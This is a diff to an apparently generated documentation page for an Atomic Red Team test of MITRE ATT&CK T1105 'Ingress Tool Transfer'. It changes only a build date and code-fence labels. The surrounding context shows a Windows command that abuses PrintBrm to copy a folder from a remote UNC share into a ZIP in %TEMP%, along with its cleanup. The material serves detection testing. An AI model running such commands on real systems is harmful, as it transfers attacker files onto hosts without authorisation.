@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "49845fc1-7961-4590-a0f0-3dbcf065ae7e"
@@ -56,14 +56,14 @@ Create a ZIP file from a folder in a remote drive
 
 ### Command
 
-```commandprompt
+```cmd
 del %TEMP%\PrintBrm.zip >nul 2>&1 
 #{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del %TEMP%\PrintBrm.zip >nul 2>&1
 ```
 
